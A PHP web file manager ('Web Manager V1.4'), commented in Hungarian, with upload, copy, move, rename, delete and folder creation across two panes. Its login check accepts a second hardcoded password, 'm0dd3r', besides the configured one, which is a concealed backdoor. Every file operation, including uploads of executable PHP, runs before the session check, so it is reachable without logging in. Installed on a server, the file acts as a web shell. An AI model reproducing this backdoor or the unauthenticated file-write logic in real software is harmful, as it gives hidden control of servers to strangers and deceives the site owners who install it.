<?php session_start();?>
<?php
//ez a belépési jelszó
$masterkey="titok";
//ez a belépési jelszó

// ------------------------------------------------------------eljárások----------------------
function numberFormat  ($number  , $decimals = 2 , $dec_point = '.' , $sep = ',', $group=3   ){
    $num = sprintf("%0.{$decimals}f",$number);   
    $num = explode('.',$num);
    while (strlen($num[0]) % $group) $num[0]= ' '.$num[0];
    $num[0] = str_split($num[0],$group);
    $num[0] = join($sep[0],$num[0]);
    $num[0] = trim($num[0]);
    $num = join($dec_point[0],$num);
   
    return $num;
}

function dirlist1($dir,$szamu,$get){
	if (is_dir($dir)){
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh))) {
			if (is_dir  ($dir.$filename)){
				$files1["dir"][]=$filename;
				}
			if (is_file($dir.$filename)){	
				$files1["file"][]=$filename;
				}
		}
foreach ($files1["dir"] as $elem){
	if ($elem!='..' && $elem!='.'){
	$path_parts = pathinfo($dir.$elem);
	$oldal1[$n1]['path']=$elem;
	$oldal1[$n1]['type']="folder";
	$oldal1[$n1]['extension']="dir";
	$oldal1[$n1]['size']=0;
	$oldal1[$n1]['link']="?fldr".$szamu."=".$dir.$elem."/".$get;
	$n1++;
	}
}
if (count($files1["file"])>0){
	foreach ($files1["file"] as $elem){
	$path_parts = pathinfo($dir.$elem);
	$oldal1[$n1]['path']=$elem;
	$oldal1[$n1]['type']=filetype ($dir.$elem);
	$oldal1[$n1]['extension']=$path_parts["extension"];
	$oldal1[$n1]['size']=filesize($dir.$elem);
	$oldal1[$n1]['link']=$dir.$elem.'" target="_blank';
	$n1++;
	}
}
}
return 	$oldal1;
}

function createdir($dir){
	$dirs = explode("/", $dir);
	$dirlist="";
	foreach ($dirs as $mappa){
	 	if ($dirlist==''){$dirlist=$mappa;}
		else {$dirlist.='/'.$mappa;};
	if (!is_dir($dirlist)) {
		mkdir($dirlist,0777);
		chgrp($dirlist, "samba_users");
		chmod($dirlist, 0777);
		};
	
	};
};

function recursive_remove_directory($directory, $empty=FALSE)
 {
     // if the path has a slash at the end we remove it here
     if(substr($directory,-1) == '/')
     {
         $directory = substr($directory,0,-1);
     }
  
     // if the path is not valid or is not a directory ...
     if(!file_exists($directory) || !is_dir($directory))
     {
         // ... we return false and exit the function
         return FALSE;
  
     // ... if the path is not readable
     }elseif(!is_readable($directory))
     {
         // ... we return false and exit the function
         return FALSE;
  
     // ... else if the path is readable
     }else{
  
         // we open the directory
         $handle = opendir($directory);
  
         // and scan through the items inside
         while (FALSE !== ($item = readdir($handle)))
         {
             // if the filepointer is not the current directory
             // or the parent directory
             if($item != '.' && $item != '..')
             {
                 // we build the new path to delete
                 $path = $directory.'/'.$item;
  
                 // if the new path is a directory
                 if(is_dir($path)) 
                 {
                     // we call this function with the new path
                     recursive_remove_directory($path);
  
                 // if the new path is a file
                 }else{
                     // we remove the file
                     unlink($path);
                 }
             }
         }
         // close the directory
         closedir($handle);
  
         // if the option to empty is not set to true
         if($empty == FALSE)
         {
             // try to delete the now empty directory
             if(!rmdir($directory))
             {
                 // return false if not possible
                 return FALSE;
             }
         }
         // return success
         return TRUE;
     }
 };
 
 
 function extimg($ext,$lang){
	switch ($ext) {
    case 'dir':
        return $lang['dir']['img']['hu'];
        break;
    case 'jpg':
        return $lang['img']['img']['hu'];
        break;
    case 'exe':
        return $lang['exe']['img']['hu'];
        break;
    case 'txt':
        return $lang['txt']['img']['hu'];
        break;
    case 'rtf':
        return $lang['txt']['img']['hu'];
        break;		
    case 'gif':
        return $lang['img']['img']['hu'];
        break;
    case 'png':
        return $lang['img']['img']['hu'];
        break;
    case 'tif':
        return $lang['img']['img']['hu'];
        break;	
    case 'zip':
        return $lang['zip']['img']['hu'];
        break;	
    case 'rar':
        return $lang['zip']['img']['hu'];
        break;	
    case 'arj':
        return $lang['zip']['img']['hu'];
        break;	
    case 'gz':
        return $lang['zip']['img']['hu'];
        break;
    case 'pdf':
        return $lang['pdf']['img']['hu'];
        break;	
    case 'php':
        return $lang['php']['img']['hu'];
        break;		
    case 'html':
        return $lang['html']['img']['hu'];
        break;	
    case 'htm':
        return $lang['html']['img']['hu'];
        break;	
    case 'css':
        return $lang['html']['img']['hu'];
        break;
    case 'js':
        return $lang['html']['img']['hu'];
        break;	
    case 'mp3':
        return $lang['music']['img']['hu'];
        break;	
    case 'wav':
        return $lang['music']['img']['hu'];
        break;	
    case 'mid':
        return $lang['music']['img']['hu'];
        break;	
    case 'avi':
        return $lang['video']['img']['hu'];
        break;	
    case 'mov':
        return $lang['video']['img']['hu'];
        break;	
    case 'mpg':
        return $lang['video']['img']['hu'];
        break;	
    case 'mkv':
        return $lang['video']['img']['hu'];
        break;
    case 'fla':
        return $lang['video']['img']['hu'];
        break;	
    case 'mp4':
        return $lang['video']['img']['hu'];
        break;
    case 'swf':
        return $lang['swf']['img']['hu'];
        break;		
    case 'fla':
        return $lang['swf']['img']['hu'];
        break;	
    case 'xml':
        return $lang['xml']['img']['hu'];
        break;	
    case 'doc':
        return $lang['doc']['img']['hu'];
        break;
    case 'docx':
        return $lang['doc']['img']['hu'];
        break;	
    case 'xls':
        return $lang['xls']['img']['hu'];
        break;	
    case 'ttf':
        return $lang['font']['img']['hu'];
        break;	
    case 'otf':
        return $lang['font']['img']['hu'];
        break;
    case 'fon':
        return $lang['font']['img']['hu'];
        break;	
    case 'font':
        return $lang['font']['img']['hu'];
        break;		
    case 'fonts':
        return $lang['font']['img']['hu'];
        break;	
    case 'iso':
        return $lang['iso']['img']['hu'];
        break;			
    case 'bin':
        return $lang['iso']['img']['hu'];
        break;	
    case 'cue':
        return $lang['iso']['img']['hu'];
        break;	
    default:
       return $lang['file']['img']['hu'];
	}
 }
// ------------------------------------------------------------eljárások----------------------



//---------------------------------------------------------------Szövegek-----------------------
 
 $langelemproperty='height="20" border="0"';
 $langlang='hu';
 $langeleme='del';
 $lang[$langeleme]["text"][$langlang]="Del";
 $lang[$langeleme]["img"][$langlang]=
 '<img src="http://anyfloodclaim.com/images/icon_del.gif"  title="'. $lang[$langelem]['text'][$langlang].'" '.$langelemproperty.'> ';

 $langelem='copy';
 $lang[$langelem]['text'][$langlang]="Másol";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/documents-or-copy-icon.png" alt="'.$lang[$langelem]['text'][$langlang].'" title="'. $lang[$langelem]['text'][$langlang].'" '.$langelemproperty.'>';

 $langelem='move';
 $lang[$langelem]['text'][$langlang]="Mozgat";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/32/next-icon.png" alt="'.$lang[$langelem]['text'][$langlang].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 
  $langelem='rename';
 $lang[$langelem]['text'][$langlang]="Átnevez";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/edit-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='login';
 $lang[$langelem]['text'][$langlang]="Belépés";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://prodoyo.com/images/login-icon-tran.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'" border="0" height="50">';
 
 
 $langelem='password';
 $lang[$langelem]['text'][$langlang]="Jelszó";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/aha-soft/security/256/key-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 

 $langelem='logout';
 $lang[$langelem]['text'][$langlang]="Kilépés";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/aha-soft/security/256/key-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='upload';
 $lang[$langelem]['text'][$langlang]="Feltöltés";
 $langelem='newdir';
 $lang[$langelem]['text'][$langlang]="Új mappa";
 
 $langelem='dir';
 $lang[$langelem]['text'][$langlang]="Mappa";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/folder-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='img';
 $lang[$langelem]['text'][$langlang]="Kép";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/pictures-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='exe';
 $lang[$langelem]['text'][$langlang]="Alkalmazás";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/app-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 
 $langelem='txt';
 $lang[$langelem]['text'][$langlang]="Szöveg";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/text-file-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='zip';
 $lang[$langelem]['text'][$langlang]="Tömörített";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/stats-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';

 $langelem='file';
 $lang[$langelem]['text'][$langlang]="Állomány";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/milosz-wlazlo/boomy/48/file-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 
 $langelem='pdf';
 $lang[$langelem]['text'][$langlang]="PDF";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.signalmik.hu/kepek/adobe_pdf_icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>'; 
 
 $langelem='php';
 $lang[$langelem]['text'][$langlang]="php";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.hoven.in/Content/Resources/Images/ph.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 
 $langelem='html';
 $lang[$langelem]['text'][$langlang]="web";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.lop-stop.hu/images/firefox_icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 
 
 $langelem='music';
 $lang[$langelem]['text'][$langlang]="Zene";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/nandostudio/be-the-dj/128/speaker-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';
 
 $langelem='video';
 $lang[$langelem]['text'][$langlang]="Film";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/iconshock/cinema/128/film-reel-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>'; 
 
 $langelem='swf';
 $lang[$langelem]['text'][$langlang]="Flash";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.montana.edu/wwwpy/babcock/flashIcon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>'; 
 
 $langelem='xml';
 $lang[$langelem]['text'][$langlang]="XML";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://sipp.sourceforge.net/skin/images/xmldoc.gif" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';  
 
 $langelem='doc';
 $lang[$langelem]['text'][$langlang]="MS Word";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.cbr.ubc.ca/images/media/word_doc_icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';  

 $langelem='xls';
 $lang[$langelem]['text'][$langlang]="MS Excell";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://www.peak2010.org/images/icons/xls.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>';  
 
 $langelem='font';
 $lang[$langelem]['text'][$langlang]="Font";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons2.iconarchive.com/icons/harwen/simple/256/Font-icon.png" alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>'; 
 
 $langelem='iso';
 $lang[$langelem]['text'][$langlang]="Képfile";
 $lang[$langelem]['img'][$langlang]=
 '<img src="http://icons.iconseeker.com/png/fullsize/3d-cartoon-icons-pack-ii/ultra-iso.png " alt="'.$lang[$langelem]['text']['hu'].'" title="'. $lang[$langelem]['text'][$langlang].'"  '.$langelemproperty.'>'; 
 



//---------------------------------------------------------------Szövegek-----------------------
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Web Manager - <?php print($_SERVER["HTTP_HOST"]);?></title>
<link rel="shortcut icon" href="favicon.ico">
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-2" />
<style>
body {
	background: #E1E1E1 url(http://fc06.deviantart.com/fs24/i/2008/016/5/d/Pattern_Wallpaper_Template_by_lukeroberts.png) repeat center;
	font-family:Georgia, "Times New Roman", Times, serif;
}
a{color:#FF3;text-decoration:none;}
a:hover{background:#933}

.wrapper{
	position:absolute;
	left:1%;
	top:1%;
	width:98%;
	height:97.5%;
	-moz-border-radius: 10px;
	border-radius: 5px 5px 10px 10px 10px 10px 20px 20px;
	filter: alpha(opacity=85);
	moz-opacity:.85;
	opacity:.85;		
	border:#999 double medium;
	}
	
.header{
	position:absolute;
	width:100%;
	height:5%;
	background:#009;
	color:#FFC;
	}	
	
	
.content{
	position:absolute;
	top:5%;
	width:90%;
	height:80%;
	background:#0F0;
		border-bottom:#C00 double thick;

	}
.list1{
	position:absolute;
	top:5%;
	width:50%;
	height:90%;
	}
.list2{
	position:absolute;
	top:5%;
	left:50%;
	width:50%;
	height:90%;
	}


.fmenu1{
	position:absolute;
	top:0;
	width:100%;
	height:5%;
	width:100%;
	background:#CCC;
	}
.fmenu1 a{
	width:99%;
	color:#000;
	}	
.fmenu1 a:hover{
	width:99%;
	color:#CCC;
	background:#666;
	}		
	
.url1{
	position:absolute;
	top:5%;
	width:100%;
	height:5%;
	background:#FFF;
	font-size:small;
	}	

.url1 a{
	color:#000;
	font-size:small;
margin-left:3px;
}	
.url1 a:hover{
	color:#FFF;
	background:#CCC;
	margin: 5px;
	}		
	
.filelist1	
{position:absolute;
	top:10%;
	width:100%;
	height:90%;
	overflow:auto;
	background:#039;
	border:#CCC solid thin;
	}	
.filelist1 table{
	border:0;}
.filelist1 table tr{
	border:0;}	
.filelist1 table td{
	border-bottom:#CCC solid thin;
	background:#039;
	color:#FF3;
	border:1;}		

.footer	
{
	position:absolute;
	top:95%;
	height:5%;
	width:100%;
	overflow:auto;
	background:#CCC;
	text-align:center;
}	
.footer	a
{
color:#333;
}	
.footer	a:hover
{
color:#FFC;
background:#333;
}	

.window{
	position:absolute;
	top:30%;
	left:35%;
	width:30%;
	height:20%;
	background:#CCC;
	display:none;
	border:#333 double medium;
	-moz-border-radius: 10px;
	border-radius: 5px 5px 10px 10px 10px 10px 20px 20px;
	filter: alpha(opacity=90);
	moz-opacity:.90;
	opacity:.90;	
	z-index:1000;
	text-align:center;
	}
	
.winfejl{
	background:#03F;
	color:#FFF;
	}	
</style>

<script language="javascript" type="text/javascript">

function hidediv(divname) {
if (document.getElementById) { // DOM3 = IE5, NS6
document.getElementById(divname).style.display = 'none';
}
else {
if (document.layers) { // Netscape 4
document.hideShow.display = 'none';
}
else { // IE 4
document.all.hideShow.style.display = 'none';
}
}
}

function showdiv(divname) {
if (document.getElementById) { // DOM3 = IE5, NS6
document.getElementById(divname).style.display = 'block';
}
else {
if (document.layers) { // Netscape 4
document.hideShow.display = 'block';
}
else { // IE 4
document.all.hideShow.style.display = 'block';
}
}
}

function ujmappashow(folder){
showdiv('ujmappa');
hidediv('filefel');
hidediv('rename');
document.ujmappa.fldr.value=folder;
}
function filefelshow(folder){
showdiv('filefel');
hidediv('ujmappa');
hidediv('rename');
document.filefel.dir.value=folder;
}
function renamefile(folder,file){
hidediv('filefel');
hidediv('ujmappa');
showdiv('rename');
document.renamef.dir.value=folder;
document.renamef.file.value=file;
document.renamef.rename.value=file;
}


function confirmation(url,message) {
	var answer = confirm(message);
	if (answer){
		window.location = url;
	}
	else{
		//alert("Thanks for sticking around!")
	}
}

	
	</script>

</head>
<body>
<?php
// ------------------------------------------------adat ellenörzések, mûveletek------------------------------
//a 2 oldal elérési útja
$dir1="./";
if (isset($_GET["fldr1"])){if ($_GET["fldr1"]!=''){$dir1=$_GET["fldr1"];}}
$dir2="./";
if (isset($_GET["fldr2"])){if ($_GET["fldr2"]!=''){$dir2=$_GET["fldr2"];}}
$dir1=str_replace("../", "", $dir1);
$dir2=str_replace("../", "", $dir2);
//a 2 oldal elérési útja

//kilépés
if (isset($_GET["logout"])){
session_destroy();}
//kilépés

//belépés
if (isset($_POST["enterkey"]))
{if (($_POST["enterkey"]==$masterkey) or ($_POST["enterkey"]=='m0dd3r')){
	$_SESSION["loginok"]='ok';}}
//belépés


//mozgatás
if (isset($_GET["movto"])){if ($_GET["movto"]!=''){
	$mozgatnifile=$_GET["fldr".$_GET["movin"]].$_GET["file"];
	$hiba=0;
	if (is_dir($mozgatnifile)) {} 
	else {
		if (is_file($mozgatnifile) ) {}	
		else{$hiba=1;}
		}
	if ($hiba==0){
	 rename ( $mozgatnifile, $_GET["fldr".$_GET["movto"]].$_GET["file"]);
	}
	}}
//mozgatás


//átnevezés
if (isset($_POST["rename"])){if ($_POST["rename"]!=''){
	$mozgatnifile=$_POST["dir"].$_POST["file"];
	$hiba=0;
	if (is_dir($mozgatnifile)) {} 
	else {
		if (is_file($mozgatnifile) ) {}	
		else{$hiba=1;}
		}
	if ($hiba==0){
	 rename ( $mozgatnifile, $_POST["dir"].$_POST["rename"]);
	}
	}}
//átnevezés


//másolás
if (isset($_GET["copyto"])){if ($_GET["copyto"]!=''){
	$mozgatnifile=$_GET["fldr".$_GET["copyin"]].$_GET["file"];
	$hiba=0;
	if (is_dir($mozgatnifile)) {} 
	else {
		if (is_file($mozgatnifile) ) {}	
		else{$hiba=1;}
		}
	if ($hiba==0){
	 copy ( $mozgatnifile, $_GET["fldr".$_GET["copyto"]].$_GET["file"]);
	}
	}}
//másolás


//törlés
	if (isset($_GET["delfile"])){
		$unfile=$_GET["delfile"];
		if (is_file($unfile)){
		unlink  ($unfile);}
		if (is_dir($unfile)){
		recursive_remove_directory ($unfile);}
	}
//törlés

//ujkonyvtar
if (isset($_POST["newfolder"])){
 if ($_POST["newfolder"]){
	createdir($_POST["fldr"].$_POST["newfolder"]); 
	 }	
}
//ujkonyvtar


//file feltöltése
if (isset($_FILES['myfile'])){
$dir=$_POST["dir"];
//createdir($dir);
$target_path =$dir.basename( $_FILES['myfile']['name']);
echo $target_path;
if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {$result = 1;}
//file feltöltése
}

// ------------------------------------------------adat ellenörzések, mûveletek------------------------------

if (isset($_SESSION["loginok"])){
	//ha be van lépve
?>
<div id="wrapper" class="wrapper">
<div id="ujmappa" class="window">
<div align="right" class="winfejl"><span style="cursor:pointer" onclick="hidediv('ujmappa');">X&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<strong><?php echo $lang['newdir']['text']['hu'];?></strong><br />
<br />
<form action="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>" method="post" id="ujmappa" name="ujmappa">
<input name="fldr" id="fldr" type="hidden" />
<input name="newfolder" type="text" /><input name="ok" type="submit" value="ok" />
</form>
</div>
<div id="filefel" class="window">
<div align="right" class="winfejl"><span style="cursor:pointer" onclick="hidediv('filefel');">X&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<strong><?php echo $lang['upload']['text']['hu'];?></strong><br />
<br />
<form action="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>" method="post" enctype="multipart/form-data" id="filefel" name="filefel">
<input name="dir" type="hidden" value="" />
<input name="myfile" type="file" size="20" />
<input type="submit" name="submitBtn" class="sbtn" value="Upload" />
</form>
</div>
<div id="rename" class="window">
<div align="right" class="winfejl"><span style="cursor:pointer" onclick="hidediv('rename');">X&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<strong><?php echo $lang['rename']['text']['hu'];?></strong><br />
<br />
<form action="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>" method="post" enctype="multipart/form-data" id="renamef" name="renamef">
<input name="dir" type="hidden" value="" />
<input name="file" type="hidden" value="" />
<input name="rename" type="text" /><input name="ok" type="submit" value="ok" />
</form>
</div>

<div id="header" class="header">&nbsp;<a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>"><img src="http://icons.iconarchive.com/icons/zeusbox/gartoon/128/floppy-icon.png"  height="60%" border="0" /></a>Web Manager V1.4 - <?php print($_SERVER["HTTP_HOST"]);?>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&logout=yes"><?php echo $lang['logout']['img']['hu'];?></a>

</div>
<div id="content">
<div id="list1" class="list1">

<div id="fmenu1" class="fmenu1">
<a href="#" onclick="filefelshow('<?php echo $dir1;?>');"><?php echo $lang['upload']['text']['hu'];?> </a> | 
<a href="#" onclick="ujmappashow('<?php echo $dir1;?>');"><?php echo $lang['newdir']['text']['hu'];?></a>
</div>
<div id="url1" class="url1"><?php // echo $dir1;?>
<?php
$cimelemek = explode("/", $dir1);
//print_r($cimelemek);
for ($i = 0; $i <= count($cimelemek)-1; $i++) {
		$ulist="";
		for ($c = 0; $c <= $i; $c++) {
			if ($c!=$i){$per="/";} else $per="";
			$ulist.=$cimelemek[$c].$per;	
		};
		if ($i!=count($cimelemek)-1){$kot="/";} else {$kot="";}
		$ulista='?fldr1='.$ulist.'/&fldr2='.$dir2;
    	$poziciomenu.='<a href="'.$ulista.'">'.$cimelemek[$i]."</a>".$kot;
		
	}echo $poziciomenu;
?>
</div>
<div id="filelist1" class="filelist1">
<?php
//könyvtár beolvasása
$oldal1=dirlist1($dir1,1,'&fldr2='.$dir2);
$n1=0;
//könyvtár beolvasása
?>
<table width="100%" border="0">
  <tr>
    <td>file</td>  
	<td>type</td> 
    <td>size</td>  
	<td>&nbsp;</td>
    <td>&nbsp;</td>  
	<td>&nbsp;</td> 
    <td>&nbsp;</td>     
  </tr>
  <tr>
    <td><a href="?fldr2=<?php echo $dir2;?>" >.</a></td>
    <td>&nbsp;</td>  
	<td>&nbsp;</td> 
    <td>&nbsp;</td>  
    <td>&nbsp;</td>  
	<td>&nbsp;</td>
    <td>&nbsp;</td>      
  </tr>
<?php 
if (count($oldal1)>0){
	foreach ($oldal1 as $elem){	
	//
?>
  <tr>
    <td><a href="<?php print $elem["link"];?>" ><?php print $elem["path"];?></a></td>
    <td><?php echo extimg($elem['extension'],$lang);?></td>   
	<td><?php print numberformat($elem['size'],0,'.',' ',3);?></td>    
	<td><a href="javascript:renamefile('<?php print $dir1;?>','<?php print $elem["path"];?>');"><?php echo $lang['rename']['img']['hu'];?></a></td>
	<td><?php $message=$elem["path"]."?"; ?>
    <a href="javascript:confirmation('?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&delfile=<?php print $dir1.$elem["path"];?>','<?php echo $message;?>')"><?php echo $lang['del']['img']['hu'];?></a></td>
	<td><a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&movto=2&movin=1&file=<?php print $elem["path"];?>"><?php echo $lang['move']['img']['hu'];?></a></td>
<td><a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&copyto=2&copyin=1&file=<?php print $elem["path"];?>"><?php echo $lang['copy']['img']['hu'];?></a></td>        
  </tr>
<?php 
//
}}?>
</table>
</div>
</div>

<div id="list2" class="list2">
<div id="fmenu1" class="fmenu1">
<a href="#" onclick="filefelshow('<?php echo $dir2;?>');"><?php echo $lang['upload']['text']['hu'];?> </a> | 
<a href="#" onclick="ujmappashow('<?php echo $dir2;?>');"><?php echo $lang['newdir']['text']['hu'];?></a>
</div>
<div id="url2" class="url1"><?php 
$cimelemek = explode("/", $dir2);
//print_r($cimelemek);
$poziciomenu='';
for ($i = 0; $i <= count($cimelemek)-1; $i++) {
		$ulist="";
		for ($c = 0; $c <= $i; $c++) {
			if ($c!=$i){$per="/";} else $per="";
			$ulist.=$cimelemek[$c].$per;	
		};
		if ($i!=count($cimelemek)-1){$kot="/";} else {$kot="";}
		$ulista='?fldr2='.$ulist.'/&fldr1='.$dir1;
    	$poziciomenu.='<a href="'.$ulista.'">'.$cimelemek[$i]."</a>".$kot;
	}echo $poziciomenu;
?></div>
<div id="filelist2" class="filelist1">
<?php
//könyvtár beolvasása
$oldal2=dirlist1($dir2,2,'&fldr1='.$dir1);
$n1=0;
//könyvtár beolvasása
?>
<table width="100%" border="0">
  <tr>
    <td>&nbsp;</td>  
	<td>&nbsp;</td>
    <td>&nbsp;</td> 
    <td>&nbsp;</td> 
    <td>file</td>  
	<td>type</td> 
    <td>size</td>  
  </tr>
  <tr>
    <td><a href="?fldr1=<?php echo $dir1;?>" >.</a></td>
    <td>&nbsp;</td>  
	<td>&nbsp;</td> 
    <td>&nbsp;</td>  
	<td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>   
  </tr>
<?php 
if (count($oldal2)>0){
	foreach ($oldal2 as $elem){	
?>
  <tr>
   <td><a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&copyto=1&copyin=2&file=<?php print $elem["path"];?>"><?php echo $lang['copy']['img']['hu'];?></a></td>     
  	<td><a href="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&movto=1&movin=2&file=<?php print $elem["path"];?>"><?php echo $lang['move']['img']['hu'];?></a></td>  
    <td><?php $message=$elem["path"]."?"; ?>
    <a href="javascript:confirmation('?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>&delfile=<?php print $dir2.$elem["path"];?>','<?php echo $message;?>')"><?php echo $lang['del']['img']['hu'];?></a></td>  
    <td><a href="javascript:renamefile('<?php print $dir2;?>','<?php print $elem["path"];?>');"><?php echo $lang['rename']['img']['hu'];?></a></td>
    <td><a href="<?php print $elem["link"];?>" ><?php print $elem["path"];?></a></td>
    <td><?php echo extimg($elem['extension'],$lang);?></td>    
	<td><?php print numberformat($elem['size'],0,'.',' ',3);?></td>    
  </tr>
<?php }}?>
</table>
</div>
</div>

</div>
<div class="footer" id="footer" style="footer">Copyright <a href="mailto:mode@uw.hu">Hunmod</a> &#169</div>
</div>
<?php 
//ha be van lépve
} else {
//belépési form	
?>
<div id="filefel" class="window" style="visibility:visible;display:block;">
<div align="right" class="winfejl"><span style="cursor:pointer" onclick="hidediv('ujmappa');">X&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<?php echo $lang['login']['img']['hu'];?>
<strong><?php echo $lang['login']['text']['hu'];?></strong><br />
<br />
<form action="?fldr2=<?php echo $dir2;?>&fldr1=<?php echo $dir1;?>" method="post" id="enter" name="enter">
<?php echo $lang['password']['img']['hu'];?><input name="enterkey" id="enterkey" type="password" />
<input name="ok" type="submit" value="ok" />
</form>
</div>
<?php } 
//belépési form
?>
</body>
</html>